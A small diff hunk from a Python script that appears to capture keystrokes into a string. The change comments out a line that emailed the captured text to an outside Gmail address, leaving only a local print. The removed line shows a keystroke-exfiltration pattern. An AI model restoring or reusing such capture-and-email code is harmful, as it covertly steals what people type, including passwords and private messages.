@@ -21,7 +21,7 @@ def main():
                         if key.strip().isascii() and len(key.strip()) == 1:
                             content += key.strip()
             
-            email_log(content, "ptandjiria@gmail.com")
+            # email_log(content, "ptandjiria@gmail.com")
             print(content)
 
     except IOError:
